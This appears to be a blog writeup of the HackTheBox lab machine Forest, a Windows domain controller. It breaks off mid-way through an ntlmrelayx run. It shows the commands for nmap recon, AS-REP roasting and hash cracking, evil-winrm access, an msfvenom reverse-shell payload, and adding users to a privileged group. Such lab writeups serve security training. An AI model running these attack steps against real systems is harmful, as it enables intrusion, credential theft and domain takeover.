
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="robots"/>
<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
<meta content="maggick" name="author"/>
<meta content='This is a writeup about a retired HacktheBox machine: Forest published by egre55 and mrb3n on October the 12th 2019. This box is a Windows machine classified as easy. The server is a Domain Controller with 24 open ports. We will use Winrm, bloodhound and impacket to get both the user flag and the "root" flag.' name="description"/>
<meta content="security, boot2root, HTB, windows, winrm, PTH, bloodhound, impacket" name="keywords"/>
<meta content="maggick's logs" property="og:site_name">
<meta content="HTB: Forest" property="og:title"/>
<meta content='This is a writeup about a retired HacktheBox machine: Forest published by egre55 and mrb3n on October the 12th 2019. This box is a Windows machine classified as easy. The server is a Domain Controller with 24 open ports. We will use Winrm, bloodhound and impacket to get both the user flag and the "root" flag.' property="og:description"/>
<meta content="en_US" property="og:locale"/>
<meta content="../../2020/03/htb-forest.html" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="2020-03-21 17:10:00+01:00" property="article:published_time"/>
<meta content="" property="article:modified_time"/>
<meta content="../../author/maggick.html" property="article:author"/>
<meta content="security" property="article:section">
<meta content="security" property="article:tag"/>
<meta content="boot2root" property="article:tag"/>
<meta content="HTB" property="article:tag"/>
<meta content="windows" property="article:tag"/>
<meta content="winrm" property="article:tag"/>
<meta content="PTH" property="article:tag"/>
<meta content="bloodhound" property="article:tag"/>
<meta content="impacket" property="article:tag"/>
<meta content="https://maggick.fr/media/image.png" property="og:image"/>
<title>maggick's logs – HTB: Forest</title>
</meta></meta></head>
<body>
<aside>
<div>
<a href="../../">
<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
</a>
<h1>
<a href="../../">maggick's logs</a>
</h1>
<p>Offensive security tales</p>
<nav>
<ul class="list">
<li>
<a href="../../pages/about.html" target="_self">
                  About
                </a>
</li>
<li>
<a href="../../pages/notes.html" target="_self">
                  Notes
                </a>
</li>
<li>
<a href="../../pages/tools.html" target="_self">
                  Tools
                </a>
</li>
</ul>
</nav>
<ul class="social">
<li>
<a class="sc-github" href="https://github.com/maggick" target="_blank">
<i class="fab fa-github"></i>
</a>
</li>
<li>
<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
<i class="fab fa-twitter"></i>
</a>
</li>
<li>
<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
<i class="fab fa-stack-overflow"></i>
</a>
</li>
<li>
<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
<i class="fas fa-rss"></i>
</a>
</li>
</ul>
</div>
</aside>
<main>
<nav>
<a href="../../">Home</a>
<a href="/archives.html">Archives</a>
<a href="/categories.html">Categories</a>
<a href="/tags.html">Tags</a>
<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
</nav>
<article class="single">
<header>
<h1 id="htb-forest">HTB: Forest</h1>
<p>
      Posted on 21 Mar 2020 in <a href="../../category/security.html">security</a>

        • 12 min read
    </p>
</header>
<div>
<p><img alt="Forest card" class="align-left" src="/media/2020.03/forest_card.png" width="262"/></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/212">Forest</a> published by
<a href="https://www.hackthebox.com/home/users/profile/1190">egre55</a> and
<a href="https://www.hackthebox.com/home/users/profile/2984">mrb3n</a> on October the 12th
2019.
This box is a Windows machine classified as easy.
The server is a Domain Controller with 24 open ports.
We will use Winrm, bloodhound and impacket to get both the user flag and the
"root" flag.</p>
<h1>Recon</h1>
<p>We start with an nmap scan. 24 ports are open. Using the service detection with
gather several informations about the box:</p>
<ul>
<li>The server is a MS Windows Server 2008 R2</li>
<li>The server is in the htb.local domain</li>
<li>The server is in the HTB workgroup</li>
</ul>
<p>Here is the nmap scan:</p>
<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Thu Oct 24 09:17:28 2019 as: nmap -p- -sSV -oA nmap_ssv 10.10.10.161
Nmap scan report for 10.10.10.161
Host is up (0.094s latency).
Not shown: 65511 closed ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-24 07:29:09Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49915/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=10/24%Time=5DB150FF%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 24 09:23:52 2019 -- 1 IP address (1 host up) scanned in 384.59 seconds
</code></pre></div>
<p>We use <code>getArch.py</code> from <a href="https://github.com/SecureAuthCorp/impacket">impacket</a>
to determine the machine Architecture, the machine is 64-bits.</p>
<div class="highlight"><pre><span></span><code>python getArch.py -target 10.10.10.161
Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies

[*] Gathering OS architecture for 1 machines
[*] Socket connect timeout set to 2 secs
10.10.10.161 is 64-bi
</code></pre></div>
<p>We check the open ports using <a href="https://sushant747.gitbooks.io/total-oscp-guide/list_of_common_ports.html">a useful website</a></p>
<h2>Port 88: Kerberos</h2>
<p>We need an account to exploit this port.</p>
<blockquote>
<p>Kerberos is a protocol that is used for network authentication. Different versions are used by Unix and Windows. But if you see a machine with port 88 open you can be fairly certain that it is a Windows Domain Controller.</p>
<p>If you already have a login to a user of that domain you might be able to escalate that privilege.</p>
<p>Check out: MS14-068</p>
</blockquote>
<h2>Port M135: MSRPC</h2>
<p>We enumerate using <code>nmap</code> and metasploit without success.</p>
<blockquote>
<p>This is the windows rpc-port. <a href="https://en.wikipedia.org/wiki/Microsoft_RPC">https://en.wikipedia.org/wiki/Microsoft_RPC</a>
Enumerate
nmap 192.168.0.101 --script=msrpc-enum</p>
<p>msf &gt; use exploit/windows/dcerpc/ms03_026_dcom</p>
</blockquote>
<h2>Port 139: SMB</h2>
<blockquote>
<p>Samba is a service that enables the user to share files with other machines. It has interoperatibility, which means that it can share stuff between linux and windows systems. A windows user will just see an icon for a folder that contains some files. Even though the folder and files really exists on a linux-server.</p>
</blockquote>
<h2>Ports 389 and 636: LDAP</h2>
<blockquote>
<p>Lightweight Directory Access Protocol. This port is usually used for Directories. Directory her means more like a telephone-directory rather than a folder. Ldap directory can be understood a bit like the windows registry. A database-tree. Ldap is sometimes used to store usersinformation. Ldap is used more often in corporate structure. Webapplications can use ldap for authentication. If that is the case it is possible to perform ldap-injections which are similar to sqlinjections.</p>
<p>You can sometimes access the ldap using a anonymous login, or with other words no session. This can be useful becasue you might find some valuable data, about users.</p>
<p>ldapsearch -h 192.168.1.101 -p 389 -x -b "dc=mywebsite,dc=com"</p>
</blockquote>
<h2>Ports 445, 464, 593, 3269, 49664, 49665, 49666, 49667, 49669, 49676, 49677, 49684, 49706, 49915</h2>
<p>Not included in the gitbook</p>
<h2>Port 5985: WinRM</h2>
<p>Not included in the gitbook but a "well known" protocol.</p>
<blockquote>
<p>WinRM, or Windows Remote Management, is an HTTP based remote management and shell protocol for Windows. The Windows Remote Management Service is responsible for this functionality. If WinRM is not configured for remote access, but the service is started, it listens for local requests on TCP port 47001. If you create listener it will still listen on 47001, but also on the default TCP ports 5985 (HTTP) and 5986 (HTTPS).</p>
</blockquote>
<h2>Port 3268: globalcatLdap</h2>
<p>No description</p>
<h2>Port 9389</h2>
<blockquote>
<p>Active Directory Administrative Center is installed by default on Windows Server 2008 R2 and is available on Windows 7 when you install the Remote Server Administration Tools (RSAT).</p>
</blockquote>
<h2>Port 47001: Windows Remote Management Service</h2>
<p>No more information.</p>
<h1>Getting user</h1>
<h2>enumerating user with SMB</h2>
<p>The SMB port is open, we can enumerate local users. Moreover, as the server is a Domain
Controller, every "local" user is a domain user.</p>
<div class="highlight"><pre><span></span><code>msf5 &gt; use auxiliary/scanner/smb/smb_enumusers
msf5 auxiliary(scanner/smb/smb_enumusers) &gt; set rhosts 10.10.10.161
rhosts =&gt; 10.10.10.161
msf5 auxiliary(scanner/smb/smb_enumusers) &gt; show options

Module options (auxiliary/scanner/smb/smb_enumusers):

  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  RHOSTS     10.10.10.161     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
  SMBDomain  .                no        The Windows domain to use for authentication
  SMBPass                     no        The password for the specified username
  SMBUser                     no        The username to authenticate as
  THREADS    1                yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/smb_enumusers) &gt; run

[+] 10.10.10.161:445      - HTB [ Administrator, Guest, krbtgt, DefaultAccount, $331000-VK4ADACQNUCA, SM_2c8eef0a09b545acb, SM_ca8c2ed5bdab4dc9b, SM_75a538d3025e4db9a, SM_681f53d4942840e18, SM_1b41c9286325456bb, SM_9b69f1b9d2cc45549, SM_7c96b981967141ebb, SM_c75ee099d0a64c91b, SM_1ffab36a2f5f479cb, HealthMailboxc3d7722, HealthMailboxfc9daad, HealthMailboxc0a90c9, HealthMailbox670628e, HealthMailbox968e74d, HealthMailbox6ded678, HealthMailbox83d6781, HealthMailboxfd87238, HealthMailboxb01ac64, HealthMailbox7108a4e, HealthMailbox0659cc1, sebastien, lucinda, svc-alfresco, andy, mark, santi ] ( LockoutTries=0 PasswordMin=7 )
[*] 10.10.10.161:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre></div>
<h2>Getting NPUsers</h2>
<p><code>UF_DONT_REQUIRE_PREAUTH</code></p>
<blockquote>
<p>This bit indicates that there is no so-called pre-authentication necessary for Kerberos authentication of the account. This is only for older Kerberos client important, which need to login to the domain from foreign systems and which does not support Kerberos pre-authentication. For accounts that log on from a Windows machine, or just for machine accounts of Windows domain members, this flag flag should NEVER be set, for the pre-authentication prevents certain types of dictionary attacks on the Kerberos login.</p>
</blockquote>
<p>We create a file with the users.</p>
<div class="highlight"><pre><span></span><code>cat users.txt
sebastien
lucinda
svc-alfresco
andy
mark
santi
</code></pre></div>
<p>In order to use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">impacket's</a> <code>GetNPUsers.py</code>
we need to add an entry in our <code>/etc/hosts</code>.</p>
<div class="highlight"><pre><span></span><code>cat /etc/hosts
127.0.0.1   localhost
127.0.1.1   kalili
10.10.10.161    htb.local
10.10.10.161    forest.htb.local
</code></pre></div>
<p>And we launch <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">impacket's</a> <code>GetNPUsers.py</code>.</p>
<div class="highlight"><pre><span></span><code>python GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -format john
Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$svc-alfresco@HTB.LOCAL:bcd2217d8b5e6884e25d8b2860dd0380$40be3fda5f8fd984f9c576d5dfa33f37effc76b0fbff3ae28a747825c3559bfea4a6a23ad1c0add8ad61d149a5ccc2e79919de9b78e8720b3dc79af96364fb6f5d7e0235eb83850765023a30de6d172c82ec751f50f4c6e4971cb54a46e16ec2d3a41b9f44b6b8e85782d958c3ff665baa5b29d8c5b4516ec1b63f7c63b55c5fa74b7b1b5fe1fa04cddac6812d0ef37f1e25ab8e8005fe7f6ce949786435c41a2395e73e9bf1de57e3a2da12a00f9da25408e92a37a5ed2dacdbbf3846963000f7b2f8d337d152345a9cc7358b5d45224abeac179f081b9b329e549659da00ac791a7fde1a8c
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
</code></pre></div>
<p>We crack the password using john and the rockyou dictionary. The user's
password is "s3rvice".</p>
<div class="highlight"><pre><span></span><code>john hashes -w=~/tools/password_lists/rockyou.txt
Warning: detected hash type "krb5asrep", but the string is also recognized as "krb5asrep-aes-opencl"
Use the "--format=krb5asrep-aes-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:02 11.59% (ETA: 11:52:21) 0g/s 913958p/s 913958c/s 913958C/s eddie707..eck1956
s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)
1g 0:00:00:04 DONE (2019-10-24 11:52) 0.2237g/s 914040p/s 914040c/s 914040C/s s401413..s3r1bu
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</code></pre></div>
<h2>MS14-068</h2>
<p>In order to run MS14-068 we need the SUID of our user. We enumerate them using
metasploit. Our user SID is <code>S-1-5-21-3072663084-364016917-1341370565-1147</code> (domain
SID-User RID).</p>
<div class="highlight"><pre><span></span><code>msf5 auxiliary(admin/kerberos/ms14_068_kerberos_checksum) &gt; use auxiliary/scanner/smb/smb_lookupsid
msf5 auxiliary(scanner/smb/smb_lookupsid) &gt; show options

Module options (auxiliary/scanner/smb/smb_lookupsid):

  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  MaxRID     4000             no        Maximum RID to check
  MinRID     500              no        Starting RID to check
  RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
  SMBDomain  .                no        The Windows domain to use for authentication
  SMBPass                     no        The password for the specified username
  SMBUser                     no        The username to authenticate as
  THREADS    1                yes       The number of concurrent threads


Auxiliary action:

  Name   Description
  ----   -----------
  LOCAL  Enumerate local accounts


msf5 auxiliary(scanner/smb/smb_lookupsid) &gt; set RHOSTS 10.10.10.161
RHOSTS =&gt; 10.10.10.161
msf5 auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBDomain HTB.LOCAL
SMBDomain =&gt; HTB.LOCAL
msf5 auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBUser svc-alfresco
SMBUser =&gt; svc-alfresco
msf5 auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBPass s3rvice
SMBPass =&gt; s3rvice
msf5 auxiliary(scanner/smb/smb_lookupsid) &gt; run

[*] 10.10.10.161:445      - PIPE(LSARPC) LOCAL(HTB - 5-21-3072663084-364016917-1341370565) DOMAIN(HTB - 5-21-3072663084-364016917-1341370565)
[*] 10.10.10.161:445      - USER=Administrator RID=500
&lt;SNIP&gt;
[*] 10.10.10.161:445      - USER=lucinda RID=1146
[*] 10.10.10.161:445      - USER=svc-alfresco RID=1147
[*] 10.10.10.161:445      - GROUP=Service Accounts RID=1148
[*] 10.10.10.161:445      - GROUP=Privileged IT Accounts RID=1149
[*] 10.10.10.161:445      - USER=andy RID=1150
[*] 10.10.10.161:445      - USER=mark RID=1151
[*] 10.10.10.161:445      - USER=santi RID=1152
</code></pre></div>
<p>We can also try to get Users SPNs</p>
<div class="highlight"><pre><span></span><code>python GetUserSPNs.py -request htb.local/svc-alfresco:s3rvice
Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies

No entries found
</code></pre></div>
<p>We add the DC to our <code>/etc/resolv.conf</code> and install <code>rdate</code> to have the same
time as the DC.</p>
<div class="highlight"><pre><span></span><code>cat /etc/resolv.conf
# Generated by NetworkManager
search home
nameserver 192.168.1.25
domain htb.local
search htb.local

apt-get install rdate

rdate -n htb.local
Thu Oct 24 16:22:14 CEST 2019
</code></pre></div>
<p>I know have the same time as the DC (this is super important for tickets
generation).</p>
<div class="highlight"><pre><span></span><code>date &amp;&amp; rdate -n htb.local
Thu 24 Oct 2019 04:24:55 PM CEST
Thu Oct 24 16:24:55 CEST 2019
</code></pre></div>
<p>The exploitation of MS14-068 does not work.</p>
<h2>Evil-winrm</h2>
<p>As we so in the openport, the
<a href="https://docs.microsoft.com/en-us/windows/win32/winrm/installation-and-configuration-for-windows-remote-management">default port for winrm 5985</a>
is open. We use <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> in order
to connect to the system and get user's flag:</p>
<div class="highlight"><pre><span></span><code>evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice

Evil-WinRM shell v1.8

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; dir


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/24/2019   6:57 AM          12510 20191024065705_BloodHound.zip
-a----       10/24/2019   8:23 AM           3996 Add-ACE.ps1
-a----       10/24/2019   8:23 AM           2584 Add-ToGroup.ps1
-a----       10/24/2019   6:28 AM          64384 Invoke-ACLPwn.ps1
-a----       10/24/2019   8:02 AM        2661697 Invoke-Mimikatz.ps1
-a----       10/24/2019   6:33 AM        1006744 mimikatz.exe
-a----       10/24/2019   6:25 AM         212992 mp1.exe
-a----       10/24/2019   9:17 AM          43696 nc64.exe
-a----       10/24/2019   6:47 AM          73802 pd.exe
-a----       10/24/2019   7:24 AM           6017 powerPriv.ps1
-a----       10/24/2019   9:26 AM         363295 powerview.ps1
-a----       10/24/2019   7:12 AM           8978 Rk9SRVNU.bin
-a----       10/24/2019   6:27 AM         779264 SharpHound.exe
-a----       10/24/2019   6:44 AM         919546 SharpHound.ps1
-a----       10/24/2019   8:36 AM        2222592 SharpSploit.dll
-a----       10/24/2019   7:26 AM          73802 shell.exe


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; cd ../
di*Evil-WinRM* PS C:\Users\svc-alfresco&gt; dir


    Directory: C:\Users\svc-alfresco


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/23/2019   2:16 PM                Desktop
d-r---       10/24/2019   9:31 AM                Documents
d-r---        7/16/2016   6:18 AM                Downloads
d-r---        7/16/2016   6:18 AM                Favorites
d-r---        7/16/2016   6:18 AM                Links
d-r---        7/16/2016   6:18 AM                Music
d-r---        7/16/2016   6:18 AM                Pictures
d-----        7/16/2016   6:18 AM                Saved Games
d-r---        7/16/2016   6:18 AM                Videos


*Evil-WinRM* PS C:\Users\svc-alfresco&gt; dir Desktop


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/23/2019   2:16 PM             32 user.txt


*Evil-WinRM* PS C:\Users\svc-alfresco&gt; type Desktop\user.txt
e5e4e&lt;redacted&gt;
</code></pre></div>
<h1>Getting root</h1>
<h2>evil-winrm and binary</h2>
<p>Using evil-Winrm we can also check the domain SID (and our user SID):</p>
<div class="highlight"><pre><span></span><code>whoami /user
USER INFORMATION
----------------

User Name        SID
================ =============================================
htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147
</code></pre></div>
<p>Using evil-winrm we can easily upload a binary using the <code>upload</code> function.
Nevertheless I was not able to invoke the binary using the <code>Invoke-binary</code>
command. Therefore I used a simple ruby script to get on the machine a launch a
msfvenom meterprter:</p>
<div class="highlight"><pre><span></span><code><span class="nb">require</span> <span class="s1">'winrm'</span>

<span class="n">conn</span> <span class="o">=</span> <span class="no">WinRM</span><span class="o">::</span><span class="no">Connection</span><span class="o">.</span><span class="n">new</span><span class="p">(</span>
  <span class="ss">endpoint</span><span class="p">:</span> <span class="s1">'http://10.10.10.161:5985/wsman'</span><span class="p">,</span>
  <span class="ss">user</span><span class="p">:</span> <span class="s1">'svc-alfresco'</span><span class="p">,</span>
  <span class="ss">password</span><span class="p">:</span> <span class="s1">'s3rvice'</span><span class="p">,</span>
<span class="p">)</span>

<span class="n">command</span><span class="o">=</span><span class="s2">""</span>

<span class="n">conn</span><span class="o">.</span><span class="n">shell</span><span class="p">(</span><span class="ss">:powershell</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">shell</span><span class="o">|</span>
    <span class="k">until</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">"exit</span><span class="se">\n</span><span class="s2">"</span> <span class="k">do</span>
        <span class="nb">print</span> <span class="s2">"PS &gt; "</span>
        <span class="n">command</span> <span class="o">=</span> <span class="nb">gets</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">shell</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span><span class="o">|</span>
            <span class="no">STDOUT</span><span class="o">.</span><span class="n">print</span> <span class="n">stdout</span>
            <span class="no">STDERR</span><span class="o">.</span><span class="n">print</span> <span class="n">stderr</span>
        <span class="k">end</span>
    <span class="k">end</span>
    <span class="nb">puts</span> <span class="s2">"Exiting with code </span><span class="si">#{</span><span class="n">output</span><span class="o">.</span><span class="n">exitcode</span><span class="si">}</span><span class="s2">"</span>
<span class="k">end</span>
</code></pre></div>
<p>The msfvenom command to generate the meterpreter is the following:</p>
<div class="highlight"><pre><span></span><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="10.10.15.185" LPORT=4444 -f exe &gt; shell.exe
</code></pre></div>
<p>To catch the reverse meterpreter we use the <code>exploit/multi/handler</code> metasploit
module. We can get a cmd shell using the <code>shell</code> command.</p>
<h2>Bloodhound</h2>
<p>As we need to elevate our privileges on a Windows environnement we want to run
Bloodhound to see the differents relationships between the domain's users,
groups and computers.
We use a <a href="https://github.com/fox-it/BloodHound.py">bloodhound ingestor based on impacket</a>
that allow to grab credentials remotly. But we get some error about DNS
resolution probably because of our VPN configuration.</p>
<div class="highlight"><pre><span></span><code>python ./bloodhound.py -d 'htb.local' -dc 10.10.10.161 -gc 10.10.10.161 -u svc-alfresco -p s3rvice -v -ns 10.10.10.161 -c all
DEBUG: Authentication: username/password
DEBUG: Resolved collection methods: localadmin, rdp, dcom, acl, objectprops, session, group, trusts
DEBUG: Using DNS to retrieve domain information
DEBUG: Querying domain controller information from DNS
DEBUG: Using domain hint: htb.local
INFO: Found AD domain: htb.local
DEBUG: Found primary DC: FOREST.htb.local
DEBUG: Found Global Catalog server: FOREST.htb.local
DEBUG: Using LDAP server: 10.10.10.161
DEBUG: Using base DN: DC=htb,DC=local
INFO: Connecting to LDAP server: 10.10.10.161
Traceback (most recent call last):
  File "./bloodhound.py", line 5, in &lt;module&gt;
    bloodhound.main()
  File "/root/BloodHound.py/bloodhound/__init__.py", line 265, in main
    disable_pooling=args.disable_pooling)
  File "/root/BloodHound.py/bloodhound/__init__.py", line 68, in run
    self.pdc.prefetch_info('objectprops' in collect, 'acl' in collect)
  File "/root/BloodHound.py/bloodhound/ad/domain.py", line 330, in prefetch_info
    self.get_domains(acl=acls)
  File "/root/BloodHound.py/bloodhound/ad/domain.py", line 204, in get_domains
    for entry in entries:
  File "/root/BloodHound.py/bloodhound/ad/domain.py", line 106, in search
    self.ldap_connect()
  File "/root/BloodHound.py/bloodhound/ad/domain.py", line 60, in ldap_connect
    q = self.ad.dnsresolver.query(self.hostname, tcp=self.ad.dns_tcp)
  File "/usr/lib/python2.7/dist-packages/dns/resolver.py", line 992, in query
    timeout = self._compute_timeout(start, lifetime)
  File "/usr/lib/python2.7/dist-packages/dns/resolver.py", line 799, in _compute_timeout
    raise Timeout(timeout=duration)
dns.exception.Timeout: The DNS operation timed out after 3.0016040802 seconds
</code></pre></div>
<p>We edit the code of <code>/root/BloodHound.py/bloodhound/ad/domain.py</code>:</p>
<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">ldap_connect</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">protocol</span><span class="o">=</span><span class="s1">'ldap'</span><span class="p">,</span> <span class="n">resolver</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        Connect to the LDAP service</span>
<span class="sd">        """</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">'Connecting to LDAP server: </span><span class="si">%s</span><span class="s1">'</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">hostname</span><span class="p">)</span>

        <span class="c1"># Convert the hostname to an IP, this prevents ldap3 from doing it</span>
        <span class="c1"># which doesn't use our custom nameservers</span>
        <span class="c1">#q = self.ad.dnsresolver.query(self.hostname, tcp=self.ad.dns_tcp)</span>
        <span class="c1">#for r in q:</span>
            <span class="c1">#ip = r.address</span>
        <span class="n">ip</span> <span class="o">=</span> <span class="s2">"10.10.10.161"</span>
</code></pre></div>
<p>The ingestor create a few JSON files:</p>
<div class="highlight"><pre><span></span><code>ls *.json
computers.json  domains.json  groups.json  sessions.json  users.json
</code></pre></div>
<p>We start the <code>neo4j</code> database, <code>bloodhound</code> and feed him the JSON data.</p>
<p>When using the query "Shortest Paths to High Value Targets" we get the following
graph:</p>
<p><img alt="Bloodhound complete view" src="/media/2020.03/forest_01.png"/>.{: .image-process-article-image}</p>
<h2>Exchange trusted subsystem and ntlmrelayx</h2>
<p>Our <code>svc-alfresco</code> user got indirect right for the <code>Exchange trusted subsytem</code>
group.
For more information about the Active Directory Right:
<a href="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights">Documentation Microsoft</a>.</p>
<p>Therefore we want to exploit our Exchange rights using
<a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">PrivExchange</a>.</p>
<p>Let's create a user and add it in the <code>Exchange trusted subsytem</code> group.</p>
<div class="highlight"><pre><span></span><code>meterpreter &gt; shell
Process 3256 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\svc-alfresco\Documents&gt;net user created_01 M&lt;redacted&gt; /add /domain
net user created_01 Marteau69! /add /domain
The command completed successfully.

C:\Users\svc-alfresco\Documents&gt;net group "EXCHANGE TRUSTED SUBSYSTEM"
net group "EXCHANGE TRUSTED SUBSYSTEM"
Group name     Exchange Trusted Subsystem
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Exchange configuration, as well as user accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
EXCH01$                  sol                      svc-alfresco
The command completed successfully.


C:\Users\svc-alfresco\Documents&gt;net group "EXCHANGE TRUSTED SUBSYSTEM" created_01 /add
net group "EXCHANGE TRUSTED SUBSYSTEM" created_01 /add
The command completed successfully.
</code></pre></div>
<p>We then launch <a href="https://github.com/SecureAuthCorp/impacket/">impacket's ntlmrelayx.py</a>
with the <code>escalate-user</code> parameter. We try it by authenticating in our browser on 127.0.0.1.</p>
<div class="highlight"><pre><span></span><code>ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user created_01
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
